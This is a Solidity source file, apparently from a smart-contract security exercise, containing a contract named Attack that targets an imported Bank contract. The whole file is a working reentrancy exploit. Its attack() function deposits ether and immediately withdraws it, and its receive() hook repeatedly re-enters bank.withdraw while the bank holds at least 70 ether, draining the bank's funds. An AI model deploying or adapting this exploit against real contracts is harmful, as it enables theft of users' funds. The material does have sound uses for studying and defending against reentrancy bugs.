// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

import "./Bank.sol";

contract Attack {
    Bank private bank;

    constructor(address _bankContractAddress) {
        bank = Bank(_bankContractAddress);
    }

    // fallback() external payable {
    //     if (address(bank).balance >= 70 ether) {
    //         bank.withdraw(10 ether);
    //     }
    // }

    receive() external payable {
        if (getBankBalance() >= uint256(70e18)) {
            bank.withdraw(10e18);
        }
    } 

    function attack() external payable {
        require(msg.value >= 1 ether, "Deposit 1 or more than 1 ether");
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function getBankAddress() external view returns (address) {
        return address(bank);
    }

    function getBankBalance() public view returns (uint256) {
        return address(bank).balance;
    }

    function getRandom() public view returns (uint256) {
        return uint256(70e18);
    }
}
